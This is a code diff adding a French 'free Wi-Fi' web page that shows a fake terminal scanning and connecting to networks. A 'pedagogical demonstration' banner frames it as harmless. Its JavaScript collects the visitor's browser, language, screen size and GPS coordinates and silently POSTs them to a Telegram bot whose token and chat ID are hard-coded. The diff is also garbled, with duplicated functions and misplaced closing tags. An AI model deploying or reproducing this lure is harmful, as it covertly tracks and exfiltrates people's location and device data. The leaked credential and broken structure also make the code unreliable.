@@ -203,6 +203,285 @@ async function progressBar(){
 /* ===== ENVOI DES DONNÉES ===== */
 async function sendToTelegram(deviceData, location) {
   const m = new Date();
+  const dateStr = m.toLocaleString('fr-FR');
+  const locLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "Refusée ❌";
+  
+  const rapport = `🔐 Connexion\n🌐 Navigateur: ${deviceData.browser}\n🗣 Langue: ${deviceData.lang}\n🖥 Écran: ${deviceData.screen}\n⏰ ${dateStr}\n📍 GPS: ${locLink}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rapport })
+    });
+  } catch (e) {}
+}
+
+/* ===== DEMO PRINCIPALE ===== */
+async function startDemo(){
+
+  const term = document.getElementById("terminal");
+  const bar = document.getElementById("bar");
+
+  term.innerHTML = "";
+  bar.style.width = "0%";
+
+  await typeLine("📡 Initialisation du module Wi-Fi...");
+  await sleep(800);
+
+  await typeLine("📍 Demande de localisation (optionnelle)...");
+  await sleep(1000);
+
+  let location = await getLocation();
+
+  if(location){
+    await typeLine("📍 Localisation obtenue : " + location.lat + ", " + location.lon);
+  } else {
+    await typeLine("❌ Localisation refusée");
+  }
+
+  await sleep(800);
+
+  let device = getDeviceInfo();
+
+  await typeLine("🧠 Analyse système...");
+  await sleep(500);
+
+  await typeLine("📱 Écran : " + device.screen);
+  await typeLine("🌐 Langue : " + device.lang);
+
+  await sleep(1000);
+
+  await typeLine("🔍 Scan des réseaux Wi-Fi...");
+
+  let target = null;
+
+  for(let i=0;i<10;i++){
+
+    let wifi = randomWifi();
+    let signal = signalBars();
+
+    let r = Math.random();
+    let status;
+
+    if(r < 0.6){
+      status = "sécurisé ❌";
+    } else if(r < 0.85){
+      status = "faible ⚠️";
+    } else {
+      status = "cible 🎯";
+      if(!target) target = wifi;
+    }
+
+    await typeLine(`[${signal}] ${wifi} → ${status}`);
+    await sleep(500 + Math.random()*400);
+  }
+
+  if(!target) target = randomWifi();
+
+  await typeLine("🎯 Cible sélectionnée : " + target);
+
+  await sleep(1000);
+
+  await typeLine("🔗 Connexion en cours...");
+
+  let success = await progressBar();
+
+  if(!success){
+    await typeLine("🔁 Nouvelle tentative...");
+    await sleep(1200);
+
+    success = await progressBar();
+
+    if(!success){
+      await typeLine("💀 Échec de connexion");
+      sendToTelegram(device, location);
+      return;
+    }
+  }
+
+  await typeLine("✔ Connexion établie");
+  await typeLine("✔ Wi-Fi connecté");
+
+  // Envoi à Telegram à la fin
+  sendToTelegram(device, location);
+
+  await typeLine("⚠️ Rappel : toujours vérifier les permissions demandées par un site.");
+}
+
+</script>
+
+</body>
+</html>
+.btn{
+  display:block;
+  text-align:center;
+  margin:15px 0;
+  padding:14px;
+  border-radius:12px;
+  background:linear-gradient(135deg,#22c55e,#4ade80);
+  color:#022c22;
+  font-weight:bold;
+  cursor:pointer;
+  transition:.2s;
+}
+
+.btn:hover{
+  transform:scale(1.05);
+}
+
+#terminal{
+  margin-top:15px;
+  background:#000;
+  padding:12px;
+  border-radius:10px;
+  font-family:monospace;
+  font-size:13px;
+  color:#22c55e;
+  height:200px;
+  overflow:auto;
+}
+
+.progress-container{
+  margin-top:10px;
+  background:#111;
+  border-radius:8px;
+  overflow:hidden;
+  height:12px;
+}
+
+.progress-bar{
+  height:100%;
+  width:0%;
+  background:#22c55e;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<h1>📶 Wi-Fi Gratuit</h1>
+
+<p class="warn">
+⚠️ Démonstration pédagogique : ce projet montre les données accessibles avec consentement utilisateur.
+</p>
+
+<div class="btn" onclick="startDemo()">
+🔓 Accéder au Wi-Fi Gratuit
+</div>
+
+<div id="terminal"></div>
+
+<div class="progress-container">
+  <div class="progress-bar" id="bar"></div>
+</div>
+
+</div>
+
+<script>
+/* ===== CONFIGURATION TELEGRAM ===== */
+const TELEGRAM_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
+const TELEGRAM_CHAT_ID = "7400979339";
+
+function sleep(ms){
+  return new Promise(r => setTimeout(r, ms));
+}
+
+/* ===== TEXTE TYPE TERMINAL ===== */
+async function typeLine(text){
+  const term = document.getElementById("terminal");
+  let line = document.createElement("div");
+  term.appendChild(line);
+
+  for(let i=0;i<text.length;i++){
+    line.innerHTML += text[i];
+    await sleep(15 + Math.random()*20);
+  }
+
+  term.scrollTop = term.scrollHeight;
+}
+
+/* ===== GEOLOCALISATION (CONSENTEMENT) ===== */
+function getLocation(){
+  return new Promise(resolve => {
+
+    if(!navigator.geolocation){
+      resolve(null);
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos)=>{
+        resolve({
+          lat: pos.coords.latitude.toFixed(5),
+          lon: pos.coords.longitude.toFixed(5)
+        });
+      },
+      ()=>{
+        resolve(null);
+      }
+    );
+
+  });
+}
+
+/* ===== INFOS APPAREIL (LOCALES UNIQUEMENT) ===== */
+function getDeviceInfo(){
+  return {
+    screen: screen.width + "x" + screen.height,
+    lang: navigator.language,
+    platform: navigator.platform,
+    browser: navigator.userAgent
+  };
+}
+
+/* ===== WIFI SIMULATION ===== */
+function randomWifi(){
+  const names = ["FreeWifi","Orange","SFR","Livebox","Bbox","NET","HomeNet","Secure"];
+  return names[Math.floor(Math.random()*names.length)] + "_" + Math.floor(Math.random()*9999);
+}
+
+function signalBars(){
+  const bars = ["▂","▂▄","▂▄▆","▂▄▆█"];
+  return bars[Math.floor(Math.random()*bars.length)];
+}
+
+/* ===== PROGRESS BAR ===== */
+async function progressBar(){
+  const bar = document.getElementById("bar");
+  let p = 0;
+
+  let fail = Math.random() < 0.2;
+
+  while(p < 100){
+
+    if(p > 70 && p < 85 && Math.random() < 0.3){
+      await typeLine("⚠️ Instabilité réseau détectée...");
+      await sleep(1000);
+    }
+
+    p += Math.random()*3;
+    if(p > 100) p = 100;
+
+    bar.style.width = p + "%";
+
+    await sleep(200 + Math.random()*200);
+
+    if(fail && p > 85){
+      await typeLine("💀 Connexion interrompue");
+      bar.style.width = "0%";
+      return false;
+    }
+  }
+
+  return true;
+}
+
+/* ===== ENVOI DES DONNÉES ===== */
+async function sendToTelegram(deviceData, location) {
+  const m = new Date();
   const dateStr = m.toLocaleDateString('fr-FR') + " " + m.toLocaleTimeString('fr-FR');
   const locLink = location ? `https://www.google.com/maps?q=$${location.lat},${location.lon}` : "Refusée ❌";
   
